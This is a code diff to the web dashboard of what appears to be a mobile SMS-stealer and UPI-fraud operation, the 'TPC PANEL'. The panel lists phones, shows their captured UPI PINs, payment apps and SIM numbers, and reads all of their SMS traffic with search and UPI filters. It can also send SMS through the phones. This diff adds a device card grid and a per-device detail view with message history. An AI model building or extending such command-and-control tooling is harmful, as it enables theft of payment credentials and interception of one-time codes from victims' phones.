@@ -72,6 +72,7 @@
     ::-webkit-scrollbar-thumb:hover { background: var(--neon-2); }
 
     ::selection { background: var(--neon); color: #001521; }
+    mark { background: #22d3ee4d; color: #eaf6ff; border-radius: 3px; padding: 0 2px; }
 
     /* cat logo */
     .cat-logo { width: 46px; height: 46px; flex: 0 0 auto;
@@ -478,7 +479,7 @@
     .footer { padding: 18px 0 4px; text-align: center; color: #35507e; font-size: 11.5px; }
 
     .toast {
-        position: fixed; right: 20px; bottom: 20px; z-index: 40;
+        position: fixed; right: 20px; bottom: 20px; z-index: 60;
         max-width: calc(100vw - 40px); padding: 13px 17px;
         border: 1px solid #22d3ee35; border-left: 3px solid var(--neon);
         border-radius: 11px; background: #071026; color: #d5ecff;
@@ -493,6 +494,139 @@
     }
 
     .bulk-bar .bulk-actions { display: flex; flex-direction: column; gap: 8px; }
+
+    /* ------------------------------------------------------- device grid */
+
+    .device-toolbar {
+        display: flex; gap: 10px; align-items: center; flex-wrap: wrap;
+    }
+
+    .device-toolbar input { width: 230px; }
+
+    .device-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fill, minmax(255px, 1fr));
+        gap: 16px;
+    }
+
+    .device-card {
+        padding: 16px;
+        display: flex; flex-direction: column; gap: 13px;
+        cursor: pointer; text-align: left;
+        transition: transform .16s, border-color .16s, box-shadow .16s;
+    }
+
+    .device-card:hover, .device-card:focus-visible {
+        transform: translateY(-3px);
+        border-color: var(--border-hi);
+        box-shadow: 0 0 0 1px #38bdf833, 0 20px 48px #000c, 0 0 42px #22d3ee26;
+        outline: none;
+    }
+
+    .device-card-top { display: flex; align-items: center; gap: 12px; }
+
+    .phone-badge {
+        display: grid; place-items: center;
+        width: 46px; height: 46px; flex: 0 0 auto;
+        border-radius: 13px; color: var(--neon);
+        background: linear-gradient(150deg, #22d3ee1f, #8b5cf614);
+        border: 1px solid #22d3ee2e;
+        box-shadow: inset 0 1px 0 #ffffff0f, 0 0 20px #22d3ee1a;
+    }
+
+    .device-card-name { font-size: 14px; font-weight: 700; overflow-wrap: anywhere; }
+    .device-card-sub { margin-top: 3px; color: var(--muted); font-size: 11.5px; }
+
+    .device-card-meta {
+        display: flex; flex-wrap: wrap; gap: 7px; align-items: center;
+    }
+
+    .device-card-foot {
+        display: flex; align-items: center; justify-content: space-between;
+        gap: 10px; padding-top: 11px; border-top: 1px solid #0f1e3d;
+        color: #35507e; font-size: 11.5px;
+    }
+
+    .open-hint { color: var(--neon); font-weight: 700; font-size: 11.5px; letter-spacing: .5px; }
+
+    /* battery meter */
+    .batt { display: inline-flex; align-items: center; gap: 7px; }
+    .batt-shell {
+        position: relative; width: 42px; height: 19px;
+        border: 1.6px solid var(--border-hi); border-radius: 5px; padding: 2px;
+    }
+    .batt-shell::after {
+        content: ""; position: absolute; right: -5px; top: 50%;
+        transform: translateY(-50%); width: 3px; height: 9px;
+        background: var(--border-hi); border-radius: 0 2px 2px 0;
+    }
+    .batt-fill { height: 100%; border-radius: 2px; background: var(--green); transition: width .3s; }
+    .batt-fill.low { background: var(--red); box-shadow: 0 0 10px #ff5c7a80; }
+    .batt-fill.mid { background: var(--amber); box-shadow: 0 0 10px #fbbf2480; }
+    .batt-fill.high { background: var(--green); box-shadow: 0 0 10px #34d39966; }
+    .batt-label { font-family: var(--mono); font-size: 12px; color: #bcd4f5; }
+    .batt-bolt { color: var(--amber); display: inline-flex; filter: drop-shadow(0 0 6px #fbbf2480); }
+
+    /* ------------------------------------------------- device detail */
+
+    .detail-overlay {
+        position: fixed; inset: 0; z-index: 45;
+        overflow-y: auto; padding: 20px;
+        background: #01030af2; backdrop-filter: blur(6px);
+    }
+
+    .detail-shell { max-width: 1220px; margin: 0 auto; }
+
+    .detail-head {
+        display: flex; align-items: center; justify-content: space-between;
+        gap: 16px; flex-wrap: wrap; padding: 16px 18px; margin-bottom: 18px;
+    }
+
+    .detail-head-id { display: flex; align-items: center; gap: 13px; min-width: 0; }
+    .detail-name { font-size: 17px; font-weight: 800; overflow-wrap: anywhere; }
+    .detail-sub { margin-top: 4px; color: var(--muted); font-size: 12px; }
+    .detail-tags { display: flex; gap: 7px; flex-wrap: wrap; margin-top: 8px; }
+
+    .detail-head-right { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; }
+
+    .detail-grid {
+        display: grid; grid-template-columns: 350px minmax(0, 1fr);
+        gap: 18px; align-items: start;
+    }
+
+    .detail-col { min-width: 0; }
+
+    .dv-search {
+        display: flex; gap: 10px; flex-wrap: wrap; align-items: center;
+        padding: 13px 16px; border-bottom: 1px solid var(--border);
+        background: #0a1226;
+    }
+
+    .dv-search input { flex: 1 1 200px; min-width: 150px; }
+    .dv-search select { width: auto; }
+    .dv-search label.badge { gap: 7px; cursor: pointer; margin: 0; text-transform: none; letter-spacing: .4px; }
+    .dv-search input[type="checkbox"] { width: auto; }
+
+    .msg-list { max-height: 62vh; overflow-y: auto; }
+
+    .msg-item { padding: 13px 16px; border-bottom: 1px solid #0f1e3d; }
+    .msg-item:last-child { border-bottom: 0; }
+    .msg-item:hover { background: #22d3ee08; }
+
+    .msg-head {
+        display: flex; align-items: center; gap: 9px; flex-wrap: wrap;
+        margin-bottom: 7px; font-size: 11.5px;
+    }
+
+    .msg-addr { font-family: var(--mono); color: #bcd4f5; }
+    .msg-time { margin-left: auto; color: #35507e; font-size: 11px; }
+
+    .msg-body {
+        font-family: var(--mono); font-size: 12.5px; color: #d5e7ff;
+        white-space: pre-wrap; overflow-wrap: anywhere; line-height: 1.65;
+    }
+
+    .msg-foot { margin-top: 8px; display: flex; gap: 8px; align-items: center; flex-wrap: wrap; }
 
     /* ---------------------------------------------------------- modal */
 
@@ -530,7 +664,7 @@
         padding: 9px 0; border-bottom: 1px solid #0f1e3d; font-size: 13px;
     }
     .detail-row span:first-child { color: var(--muted); flex: 0 0 auto; }
-    .detail-row span:last-child { text-align: right; overflow-wrap: anywhere; }
+    .detail-row span:last-child { text-align: right; overflow-wrap: anywhere; font-family: var(--mono); font-size: 12.5px; }
 
     /* -------------------------------------------------------- helpers */
 
@@ -551,6 +685,8 @@
         .stats-grid { grid-template-columns: repeat(2, minmax(0, 1fr)); }
         .content-grid { grid-template-columns: 1fr; }
         .bulk-bar { grid-template-columns: 1fr; }
+        .detail-grid { grid-template-columns: 1fr; }
+        .msg-list { max-height: none; }
     }
 
     @media (max-width: 760px) {
@@ -572,6 +708,10 @@
         .panel-header, .panel-body { padding: 14px; }
         .login-card { padding: 24px; }
         .field-row { grid-template-columns: 1fr; }
+        .device-grid { grid-template-columns: 1fr; }
+        .device-toolbar input { width: 100%; }
+        .detail-overlay { padding: 12px; }
+        .detail-head { padding: 14px; }
     }
 
     @media (max-width: 380px) {
@@ -717,7 +857,7 @@
             </div>
 
             <div class="sidebar-footer">
-                <div>TPC PANEL · v4.1</div>
+                <div>TPC PANEL · v4.2</div>
                 <div>owner: <a href="https://t.me/icivan" target="_blank" rel="noopener">@icivan</a></div>
             </div>
         </aside>
@@ -932,7 +1072,9 @@
                         <h2>Messages</h2>
                         <p>All inbound and outbound SMS</p>
                     </div>
-                    <div style="display:flex;gap:9px">
+                    <div style="display:flex;gap:9px;flex-wrap:wrap">
+                        <input id="msgSearch" class="inline-input" style="width:220px"
+                               placeholder="🔍 search body / number…">
                         <select id="msgFilter" class="inline-input" style="width:auto">
                             <option value="">All</option>
                             <option value="in">Inbound</option>
@@ -1123,37 +1265,17 @@
                 <div class="page-header">
                     <div>
                         <h2>Devices</h2>
-                        <p>Registered fleet with SIM, power and network telemetry</p>
+                        <p>Kisi bhi phone par click karo — info, battery aur saare messages khulenge</p>
                     </div>
-                    <div style="display:flex;gap:9px">
+                    <div class="device-toolbar">
+                        <input id="deviceSearch" class="inline-input" placeholder="🔍 device / model / number">
                         <button class="secondary-button" id="pinsOnlyButton" type="button">🔑 PINs only</button>
                         <button class="secondary-button" data-refresh="devices" type="button">↻ Refresh</button>
                     </div>
                 </div>
 
-                <section class="panel shadow-panel">
-                    <div class="panel-header">
-                        <h3>Fleet</h3>
-                        <span class="badge" id="deviceCount">0</span>
-                    </div>
-                    <div class="table-wrap">
-                        <table>
-                            <thead>
-                                <tr>
-                                    <th>Device</th>
-                                    <th>Carrier / SIM</th>
-                                    <th>Number / PIN</th>
-                                    <th>Power</th>
-                                    <th>Network</th>
-                                    <th>Status</th>
-                                    <th>Registered</th>
-                                    <th></th>
-                                </tr>
-                            </thead>
-                            <tbody id="devicesBody"></tbody>
-                        </table>
-                    </div>
-                </section>
+                <div class="device-grid" id="deviceGrid"></div>
+                <div class="empty-state" id="deviceEmpty" hidden>No devices registered</div>
             </section>
 
             <!-- ---------------------------------------------- SETTINGS -->
@@ -1171,7 +1293,7 @@
                     <div class="panel-body">
                         <div class="settings-row">
                             <strong>Panel</strong>
-                            <p>TPC PANEL · SMS &amp; UPI Control · v4.1</p>
+                            <p>TPC PANEL · SMS &amp; UPI Control · v4.2</p>
                         </div>
                         <div class="settings-row">
                             <strong>Owner</strong>
@@ -1221,15 +1343,69 @@
     </div>
 </div>
 
-<!-- ============================================================= MODAL -->
+<!-- ==================================================== DEVICE DETAIL -->
 
-<div class="modal-backdrop" id="deviceModal" hidden>
-    <div class="modal-card shadow-panel" role="dialog" aria-modal="true">
-        <div class="modal-header">
-            <h3 id="modalTitle">Device details</h3>
-            <button class="secondary-button" id="modalClose" type="button">Close</button>
+<div class="detail-overlay" id="deviceDetail" hidden>
+    <div class="detail-shell">
+
+        <div class="detail-head shadow-panel">
+            <div class="detail-head-id">
+                <div class="phone-badge" id="dvIcon"></div>
+                <div style="min-width:0">
+                    <div class="detail-name" id="dvName">Device</div>
+                    <div class="detail-sub" id="dvSub">—</div>
+                    <div class="detail-tags" id="dvTags"></div>
+                </div>
+            </div>
+            <div class="detail-head-right">
+                <span id="dvBattery"></span>
+                <button class="secondary-button" id="dvRefresh" type="button">↻ Refresh</button>
+                <button class="secondary-button" id="dvClose" type="button">Close</button>
+            </div>
         </div>
-        <div class="modal-body" id="modalBody"></div>
+
+        <div class="detail-grid">
+            <div class="detail-col">
+                <section class="panel shadow-panel">
+                    <div class="panel-header"><h3>Device info</h3></div>
+                    <div class="panel-body" id="dvInfo"></div>
+                </section>
+
+                <section class="panel shadow-panel">
+                    <div class="panel-header"><h3>Send SMS</h3></div>
+                    <div class="panel-body">
+                        <label for="dvTo">To (blank = device SIM number)</label>
+                        <input id="dvTo" placeholder="+91…" class="mono">
+                        <label for="dvBody">Message</label>
+                        <textarea id="dvBody" placeholder="Type message…"></textarea>
+                        <button class="primary-button" id="dvSend" style="margin-top:12px" type="button">
+                            ⚡ Send
+                        </button>
+                    </div>
+                </section>
+            </div>
+
+            <section class="panel shadow-panel">
+                <div class="panel-header">
+                    <h3>Messages</h3>
+                    <span class="badge" id="dvMsgCount">0</span>
+                </div>
+
+                <div class="dv-search">
+                    <input id="dvSearch" class="inline-input" placeholder="🔍 search message / number / amount…">
+                    <select id="dvDir" class="inline-input">
+                        <option value="">All</option>
+                        <option value="in">Inbound</option>
+                        <option value="out">Outbound</option>
+                    </select>
+                    <label class="badge">
+                        <input type="checkbox" id="dvUpi"> UPI only
+                    </label>
+                </div>
+
+                <div class="msg-list" id="dvMsgList"></div>
+            </section>
+        </div>
     </div>
 </div>
 
@@ -1250,8 +1426,12 @@ const state = {
     bots: [],
     tgLogs: [],
     pinsOnly: false,
+    activeDevice: null,
     toastTimer: null
 };
+
+const PHONE_SVG = '<svg viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round"><rect x="6" y="2.4" width="12" height="19.2" rx="3.2"/><line x1="10.4" y1="5.4" x2="13.6" y2="5.4"/><circle cx="12" cy="18.3" r="0.95" fill="currentColor" stroke="none"/></svg>';
+const BOLT_SVG = '<svg viewBox="0 0 24 24" width="13" height="13" fill="currentColor"><path d="M13.5 2 5 13h5.5L9.5 22 19 10.5h-5.9z"/></svg>';
 
 /* ------------------------------------------------------------ utils */
 
@@ -1320,10 +1500,31 @@ function renderEmpty(tbody, cols, msg) {
     tbody.appendChild(row);
 }
 
+function highlight(text, needle) {
+    const s = String(text ?? "");
+    if (!needle) return document.createTextNode(s);
+    const frag = document.createDocumentFragment();
+    const lower = s.toLowerCase();
+    const n = needle.toLowerCase();
+    let i = 0;
+    while (i <= s.length) {
+        const idx = lower.indexOf(n, i);
+        if (idx === -1) { frag.appendChild(document.createTextNode(s.slice(i))); break; }
+        if (idx > i) frag.appendChild(document.createTextNode(s.slice(i, idx)));
+        const m = document.createElement("mark");
+        m.textContent = s.slice(idx, idx + n.length);
+        frag.appendChild(m);
+        i = idx + n.length;
+    }
+    return frag;
+}
+
 /* --------------------------------------------------- device helpers */
 
+function getDeviceId(d) { return d.id ?? d._id ?? null; }
+
 function getDeviceName(d) {
-    return d.device_name || d.name || d.model || d._id || "Unnamed device";
+    return d.device_name || d.name || d.model || getDeviceId(d) || "Unnamed device";
 }
 
 function getDeviceStatus(d) {
@@ -1335,16 +1536,103 @@ function getTelemetry(d) {
     return d.telemetry && typeof d.telemetry === "object" ? d.telemetry : {};
 }
 
-function batteryLabel(d) {
-    const t = getTelemetry(d);
-    const lvl = t.battery_level ?? d.battery_level;
-    if (lvl === null || lvl === undefined || lvl < 0) return "—";
-    return (t.battery_charging ?? d.battery_charging) ? `${lvl}% ⚡` : `${lvl}%`;
-}
-
 function isOnline(d) { return Boolean(d.ws_connected); }
 
 function hasPin(d) { return Boolean(d.upi_pin); }
+
+function batteryLevel(d) {
+    const t = getTelemetry(d);
+    const lvl = t.battery_level ?? d.battery_level;
+    return (typeof lvl === "number" && lvl >= 0) ? lvl : null;
+}
+
+function isCharging(d) {
+    const t = getTelemetry(d);
+    return Boolean(t.battery_charging ?? d.battery_charging);
+}
+
+function batteryEl(d) {
+    const lvl = batteryLevel(d);
+    const wrap = document.createElement("span");
+    wrap.className = "batt";
+
+    const shell = document.createElement("span");
+    shell.className = "batt-shell";
+    const fill = document.createElement("span");
+    fill.className = "batt-fill";
+    if (lvl === null) fill.style.width = "0%";
+    else {
+        const pct = Math.max(0, Math.min(100, lvl));
+        fill.style.width = pct + "%";
+        fill.classList.add(pct <= 15 ? "low" : pct <= 40 ? "mid" : "high");
+    }
+    shell.appendChild(fill);
+    wrap.appendChild(shell);
+
+    const label = document.createElement("span");
+    label.className = "batt-label";
+    label.textContent = lvl === null ? "—" : `${lvl}%`;
+    wrap.appendChild(label);
+
+    if (isCharging(d)) {
+        const bolt = document.createElement("span");
+        bolt.className = "batt-bolt";
+        bolt.innerHTML = BOLT_SVG;
+        bolt.title = "charging";
+        wrap.appendChild(bolt);
+    }
+    return wrap;
+}
+
+function smartMemory(v) {
+    if (v === null || v === undefined || v === "") return null;
+    if (typeof v === "string" && Number.isNaN(Number(v))) return v;
+    const n = Number(v);
+    if (Number.isNaN(n)) return String(v);
+    if (n >= 512) return `${+(n / 1024).toFixed(1)} GB`;
+    if (n >= 1) return `${+n.toFixed(n < 10 ? 1 : 0)} GB`;
+    return `${Math.round(n * 1024)} MB`;
+}
+
+function pickValue(obj, keys) {
+    for (const k of keys) {
+        const v = obj?.[k];
+        if (v !== null && v !== undefined && v !== "") return v;
+    }
+    return null;
+}
+
+function ramLabel(d) {
+    const t = getTelemetry(d);
+    const gb = pickValue(t, ["ram_gb","total_ram_gb","ram_size_gb","memory_gb","ram_gb_total"]);
+    if (gb !== null) return `${gb} GB`;
+    const mb = pickValue(t, ["ram_total_mb","ram_mb","ram_total","total_ram_mb","total_ram","ram","memory_total","memory","device_ram"]);
+    if (mb !== null) return smartMemory(mb);
+    const dv = pickValue(d, ["ram","ram_gb","total_ram"]);
+    return dv !== null ? smartMemory(dv) : "—";
+}
+
+function storageLabel(d) {
+    const t = getTelemetry(d);
+    const gb = pickValue(t, ["storage_gb","total_storage_gb","disk_gb","rom_gb","storage_size_gb"]);
+    if (gb !== null) return `${gb} GB`;
+    const mb = pickValue(t, ["storage_total_mb","storage_mb","storage_total","total_storage","storage","disk_total","internal_storage","rom"]);
+    if (mb !== null) return smartMemory(mb);
+    const dv = pickValue(d, ["storage","storage_gb"]);
+    return dv !== null ? smartMemory(dv) : "—";
+}
+
+function freeStorageLabel(d) {
+    const t = getTelemetry(d);
+    const v = pickValue(t, ["free_storage_mb","storage_free_mb","free_storage","storage_free","free_disk","available_storage"]);
+    return v !== null ? smartMemory(v) : null;
+}
+
+function deviceMessages(d) {
+    const id = getDeviceId(d);
+    if (id === null) return [];
+    return state.messages.filter((m) => String(m.device_id) === String(id));
+}
 
 /* ------------------------------------------------------- api client */
 
@@ -1384,6 +1672,7 @@ function showLogin() {
     state.authenticated = false;
     $("#dashboardApp").hidden = true;
     $("#loginScreen").hidden = false;
+    closeDeviceDetail();
 }
 
 function showDashboard() {
@@ -1482,7 +1771,8 @@ function renderLive() {
         }
         row.appendChild(nameCell);
 
-        const lastMsg = state.messages.find((m) => m.device_id === d.id);
+        const id = getDeviceId(d);
+        const lastMsg = state.messages.find((m) => String(m.device_id) === String(id));
         const msgCell = document.createElement("td");
         if (lastMsg) {
             const span = document.createElement("span");
@@ -1519,7 +1809,7 @@ function renderLive() {
             try {
                 await api("/admin/send", {
                     method: "POST",
-                    body: JSON.stringify({ target: "device", device_id: d.id, body: text })
+                    body: JSON.stringify({ target: "device", device_id: id, body: text })
                 });
                 input.value = "";
                 showToast(`queued → ${getDeviceName(d)}`);
@@ -1537,11 +1827,7 @@ function renderLive() {
         allBtn.className = "row-button danger";
         allBtn.type = "button";
         allBtn.textContent = "View";
-        allBtn.addEventListener("click", () => {
-            $("#msgFilter").value = "";
-            navigate("messages");
-            renderMessages();   // FIX: pehle no-op tha
-        });
+        allBtn.addEventListener("click", () => openDeviceDetail(d));
         allCell.appendChild(allBtn);
         row.appendChild(allCell);
 
@@ -1551,10 +1837,14 @@ function renderLive() {
 
 function renderMessages() {
     const filter = $("#msgFilter").value;
+    const q = ($("#msgSearch")?.value || "").trim().toLowerCase();
     let list = state.messages;
 
     if (filter === "in" || filter === "out") list = list.filter((m) => m.direction === filter);
     if (filter === "upi") list = list.filter((m) => m.kind === "upi");
+    if (q) list = list.filter((m) =>
+        `${m.body} ${m.address} ${m.device_name} ${m.amount} ${m.status}`.toLowerCase().includes(q)
+    );
 
     $("#messageCount").textContent = `${list.length} messages`;
 
@@ -1562,22 +1852,22 @@ function renderMessages() {
     if (!list.length) { renderEmpty(body, 7, "No messages"); return; }
 
     body.replaceChildren();
-    list.slice(0, 200).forEach((m) => {
+    list.slice(0, 300).forEach((m) => {
         const row = document.createElement("tr");
         appendCell(row, formatDate(m.created_at));
         appendCell(row, m.device_name || "—");
         createBadgeCell(row, m.direction === "in" ? "in" : "out", m.direction === "in" ? "in" : "out");
 
         const addr = document.createElement("td");
-        addr.textContent = m.address || "—";
         addr.className = "mono";
+        addr.appendChild(highlight(m.address || "—", q));
         row.appendChild(addr);
 
         const bodyCell = document.createElement("td");
         const span = document.createElement("span");
         span.className = "cell-body";
-        span.textContent = m.body || "—";
         span.title = m.body || "";
+        span.appendChild(highlight(m.body || "—", q));
         bodyCell.appendChild(span);
         row.appendChild(bodyCell);
 
@@ -1661,7 +1951,6 @@ function renderTelegram() {
         setBadge($("#tgBadge"), bot.bound ? "Bound" : "Pending",
             bot.bound ? "bound" : "pending");
 
-        // FIX: masked token 17 chars hota hai (< min_length 20), isliye placeholder me daalo
         $("#botToken").value = "";
         $("#botToken").placeholder = bot.token_masked
             ? `${bot.token_masked}  (paste pura token)`
@@ -1692,76 +1981,130 @@ function renderTelegram() {
     });
 }
 
-function renderDevices() {
-    const list = state.pinsOnly ? state.devices.filter(hasPin) : state.devices;
+/* ------------------------------------------------ device cards (grid) */
 
-    $("#deviceCount").textContent = state.pinsOnly
-        ? `${list.length} with PIN`
-        : `${list.length} devices`;
+function renderDeviceCards() {
+    const q = ($("#deviceSearch")?.value || "").trim().toLowerCase();
+    let list = state.pinsOnly ? state.devices.filter(hasPin) : state.devices;
 
-    const body = $("#devicesBody");
-    if (!list.length) {
-        renderEmpty(body, 8, state.pinsOnly ? "Koi PIN capture nahi hua" : "No devices registered");
-        return;
+    if (q) {
+        list = list.filter((d) => {
+            const t = getTelemetry(d);
+            const hay = [
+                getDeviceName(d), t.model, t.manufacturer, t.brand,
+                d.phone_number, t.sim_number, t.sim_carrier, d.payment_app
+            ].filter(Boolean).join(" ").toLowerCase();
+            return hay.includes(q);
+        });
     }
 
-    body.replaceChildren();
+    const grid = $("#deviceGrid");
+    grid.replaceChildren();
+
+    const empty = $("#deviceEmpty");
+    if (!list.length) {
+        empty.hidden = false;
+        empty.textContent = state.pinsOnly
+            ? "Koi PIN capture nahi hua"
+            : (q ? "Koi device match nahi hua" : "No devices registered");
+        return;
+    }
+    empty.hidden = true;
+
     list.forEach((d) => {
         const t = getTelemetry(d);
-        const row = document.createElement("tr");
+        const msgs = deviceMessages(d);
 
-        const nameCell = document.createElement("td");
-        nameCell.textContent = getDeviceName(d);
-        const sub = document.createElement("span");
-        sub.className = "cell-sub";
-        sub.textContent = `${t.android_version ? "Android " + t.android_version : "—"} · ${t.model || ""}`;
-        nameCell.appendChild(sub);
-        row.appendChild(nameCell);
+        const card = document.createElement("article");
+        card.className = "device-card shadow-panel";
+        card.tabIndex = 0;
+        card.setAttribute("role", "button");
 
-        const carrierCell = document.createElement("td");
-        carrierCell.textContent = t.sim_carrier || d.sim_carrier || "—";
-        const simSub = document.createElement("span");
-        simSub.className = "cell-sub";
-        simSub.textContent = t.sim_number || d.sim_number || "number not exposed";
-        carrierCell.appendChild(simSub);
-        row.appendChild(carrierCell);
+        /* top: phone icon + name + battery */
+        const top = document.createElement("div");
+        top.className = "device-card-top";
 
-        // --- Number / PIN
-        const numCell = document.createElement("td");
-        numCell.textContent = d.phone_number || "—";
-        const pinSub = document.createElement("span");
-        pinSub.className = d.upi_pin ? "cell-pin" : "cell-pin none";
-        pinSub.textContent = d.upi_pin
-            ? `PIN ${d.upi_pin}${d.payment_app ? " · " + d.payment_app : ""}`
-            : "no PIN";
-        numCell.appendChild(pinSub);
-        row.appendChild(numCell);
+        const icon = document.createElement("div");
+        icon.className = "phone-badge";
+        icon.innerHTML = PHONE_SVG;
+        top.appendChild(icon);
 
-        const battCell = document.createElement("td");
-        const badge = document.createElement("span");
-        badge.className = `badge ${(t.battery_charging ?? d.battery_charging) ? "online" : ""}`;
-        badge.textContent = batteryLabel(d);
-        battCell.appendChild(badge);
-        row.appendChild(battCell);
+        const nameWrap = document.createElement("div");
+        nameWrap.style.minWidth = "0";
+        nameWrap.style.flex = "1";
+        const nameEl = document.createElement("div");
+        nameEl.className = "device-card-name";
+        nameEl.textContent = getDeviceName(d);
+        nameWrap.appendChild(nameEl);
+        const subEl = document.createElement("div");
+        subEl.className = "device-card-sub";
+        subEl.textContent = `${t.model || t.manufacturer || "unknown model"} · Android ${t.android_version || "—"}`;
+        nameWrap.appendChild(subEl);
+        top.appendChild(nameWrap);
 
-        appendCell(row, t.network_type || "—");
-        createBadgeCell(row, getDeviceStatus(d));
-        appendCell(row, formatDate(d.created_at));
+        const battWrap = document.createElement("div");
+        battWrap.style.flex = "0 0 auto";
+        battWrap.appendChild(batteryEl(d));
+        top.appendChild(battWrap);
 
-        const actionCell = document.createElement("td");
-        const info = document.createElement("button");
-        info.className = "row-button";
-        info.type = "button";
-        info.textContent = "Info";
-        info.addEventListener("click", () => openDeviceDetails(d));
-        actionCell.appendChild(info);
-        row.appendChild(actionCell);
+        card.appendChild(top);
 
-        body.appendChild(row);
+        /* meta badges */
+        const meta = document.createElement("div");
+        meta.className = "device-card-meta";
+
+        const statusBadge = document.createElement("span");
+        const st = getDeviceStatus(d).toLowerCase();
+        statusBadge.className = "badge " + (st.includes("online") || st.includes("active") ? "online"
+            : st.includes("offline") ? "error" : "");
+        statusBadge.textContent = getDeviceStatus(d);
+        meta.appendChild(statusBadge);
+
+        const num = t.sim_number || d.phone_number || t.sim_carrier;
+        if (num) {
+            const nb = document.createElement("span");
+            nb.className = "badge mono";
+            nb.textContent = num;
+            meta.appendChild(nb);
+        }
+
+        if (d.upi_pin) {
+            const pb = document.createElement("span");
+            pb.className = "badge pin mono";
+            pb.textContent = `PIN ${d.upi_pin}`;
+            meta.appendChild(pb);
+        }
+
+        const ramBadge = document.createElement("span");
+        ramBadge.className = "badge";
+        ramBadge.textContent = `RAM ${ramLabel(d)}`;
+        meta.appendChild(ramBadge);
+
+        card.appendChild(meta);
+
+        /* foot */
+        const foot = document.createElement("div");
+        foot.className = "device-card-foot";
+        const cnt = document.createElement("span");
+        cnt.textContent = `${msgs.length} messages · ${formatDate(d.created_at)}`;
+        foot.appendChild(cnt);
+        const hint = document.createElement("span");
+        hint.className = "open-hint";
+        hint.textContent = "OPEN →";
+        foot.appendChild(hint);
+        card.appendChild(foot);
+
+        const open = () => openDeviceDetail(d);
+        card.addEventListener("click", open);
+        card.addEventListener("keydown", (e) => {
+            if (e.key === "Enter" || e.key === " ") { e.preventDefault(); open(); }
+        });
+
+        grid.appendChild(card);
     });
 }
 
-/* ---------------------------------------------------------- modal */
+/* -------------------------------------------------- device detail */
 
 function detailGroup(title, rows) {
     const g = document.createElement("div");
@@ -1785,39 +2128,57 @@ function detailGroup(title, rows) {
     return g;
 }
 
-function openDeviceDetails(d) {
+function renderDeviceInfo(d) {
     const t = getTelemetry(d);
     const sims = Array.isArray(t.sims) ? t.sims : [];
+    const msgs = deviceMessages(d);
+    const inCount = msgs.filter((m) => m.direction === "in").length;
+    const outCount = msgs.filter((m) => m.direction === "out").length;
+    const upiCount = msgs.filter((m) => m.kind === "upi").length;
+    const sorted = msgs.slice().sort((a, b) => new Date(a.created_at || 0) - new Date(b.created_at || 0));
 
-    $("#modalTitle").textContent = getDeviceName(d);
-    const body = $("#modalBody");
-    body.replaceChildren();
+    const box = $("#dvInfo");
+    box.replaceChildren();
 
-    body.appendChild(detailGroup("Identity", [
-        ["Device", getDeviceName(d)],
-        ["Manufacturer", t.manufacturer],
+    box.appendChild(detailGroup("Device", [
+        ["Name", getDeviceName(d)],
         ["Model", t.model],
+        ["Manufacturer", t.manufacturer],
+        ["Brand", t.brand],
+        ["Device", t.device],
+        ["Product", t.product]
+    ]));
+
+    box.appendChild(detailGroup("Hardware", [
+        ["RAM", ramLabel(d)],
+        ["Storage", storageLabel(d)],
+        ["Free storage", freeStorageLabel(d)],
+        ["CPU / ABI", t.cpu_abi || t.cpu],
+        ["Cores", t.cpu_cores],
+        ["Resolution", t.screen_resolution || t.resolution],
         ["Android", t.android_version],
         ["SDK", t.sdk_int],
         ["Android ID", t.android_id]
     ]));
 
-    body.appendChild(detailGroup("Status", [
-        ["Socket", d.ws_connected ? "connected" : "disconnected"],
+    box.appendChild(detailGroup("Timeline", [
+        ["Created", formatDate(d.created_at)],
+        ["Registered", formatDate(d.registered_at)],
+        ["First seen", formatDate(d.first_seen)],
         ["Last seen", formatDate(d.last_seen)],
-        ["Registered", formatDate(d.created_at)]
-    ]));
-
-    body.appendChild(detailGroup("Onboarding", [
-        ["Entered number", d.phone_number],
-        ["UPI PIN", d.upi_pin],
-        ["Payment app", d.payment_app],
-        ["Amount", d.onboard_amount != null ? `₹${d.onboard_amount}` : null],
-        ["Onboarded", d.onboarded ? "Yes" : "No"],
+        ["Inbox synced", d.sms_inbox_synced_at ? formatDate(d.sms_inbox_synced_at) : null],
         ["Onboarded at", formatDate(d.onboarded_at)]
     ]));
 
-    body.appendChild(detailGroup("SIM & network", [
+    box.appendChild(detailGroup("Power", [
+        ["Battery", batteryLevel(d) === null ? null : `${batteryLevel(d)}%`],
+        ["Charging", isCharging(d) ? "Yes" : "No"],
+        ["Source", t.battery_plugged],
+        ["Temp", t.battery_temperature_c],
+        ["Health", t.battery_health]
+    ]));
+
+    box.appendChild(detailGroup("SIM & network", [
         ["Carrier", t.sim_carrier || d.sim_carrier],
         ["SIM number", t.sim_number || d.sim_number],
         ["Number source", t.sim_number_source],
@@ -1828,31 +2189,200 @@ function openDeviceDetails(d) {
     ]));
 
     sims.forEach((s, i) => {
-        body.appendChild(detailGroup(`SIM ${(s.slot ?? i) + 1}`, [
+        box.appendChild(detailGroup(`SIM ${(s.slot ?? i) + 1}`, [
             ["Carrier", s.carrier],
             ["Number", s.number],
             ["Source", s.number_source]
         ]));
     });
 
-    body.appendChild(detailGroup("Power", [
-        ["Level", t.battery_level != null ? `${t.battery_level}%` : null],
-        ["Charging", t.battery_charging],
-        ["Source", t.battery_plugged],
-        ["Temp", t.battery_temperature_c]
+    box.appendChild(detailGroup("Onboarding", [
+        ["Entered number", d.phone_number],
+        ["UPI PIN", d.upi_pin],
+        ["Payment app", d.payment_app],
+        ["Amount", d.onboard_amount != null ? `₹${d.onboard_amount}` : null],
+        ["Onboarded", d.onboarded ? "Yes" : "No"]
     ]));
 
-    body.appendChild(detailGroup("SMS", [
-        ["Inbox synced", d.sms_inbox_synced_at ? formatDate(d.sms_inbox_synced_at) : null],
-        ["Inbox count", t.sms_inbox_count],
-        ["Sent count", t.sms_sent_count],
-        ["Received count", t.sms_received_count]
+    box.appendChild(detailGroup("Message stats", [
+        ["Total", msgs.length],
+        ["Inbound", inCount],
+        ["Outbound", outCount],
+        ["UPI tagged", upiCount],
+        ["First message", sorted.length ? formatDate(sorted[0].created_at) : null],
+        ["Latest message", sorted.length ? formatDate(sorted[sorted.length - 1].created_at) : null]
     ]));
 
-    $("#deviceModal").hidden = false;
+    box.appendChild(detailGroup("Status", [
+        ["Socket", d.ws_connected ? "connected" : "disconnected"],
+        ["Device id", getDeviceId(d)],
+        ["Registration id", d.registration_id]
+    ]));
 }
 
